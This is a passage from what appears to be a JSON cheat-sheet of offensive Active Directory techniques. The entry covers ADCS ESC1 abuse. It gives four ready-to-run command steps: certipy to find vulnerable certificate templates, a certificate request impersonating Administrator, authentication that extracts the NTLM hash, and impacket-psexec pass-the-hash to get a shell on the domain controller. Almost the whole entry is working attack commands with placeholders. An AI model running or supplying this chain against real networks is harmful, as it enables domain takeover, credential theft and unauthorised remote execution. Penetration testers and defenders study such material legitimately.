    {
        "category": "AD",
        "technique": "ADCS ESC1",
        "description": "Misconfigured certificate template — request cert as any user",
        "steps": [
            {
                "step": 1,
                "note": "Find vulnerable templates",
                "command": "certipy-ad find -u <user> -p '<password>' -dc-ip <dc_ip> -target <domain> -vulnerable -enabled"
            },
            {
                "step": 2,
                "note": "Request cert impersonating target user (ESC1)",
                "command": "certipy-ad req -u '<user>@<domain>' -p '<password>' -ca '<ca_name>' -template '<template>' -upn 'Administrator@<domain>' -dc-ip <dc_ip> -target <dc_fqdn>"
            },
            {
                "step": 3,
                "note": "Auth with PFX to get NTLM hash",
                "command": "certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>"
            },
            {
                "step": 4,
                "note": "Use hash for PTH",
                "command": "impacket-psexec -hashes ':<ntlm>' Administrator@<dc_ip>"
            }
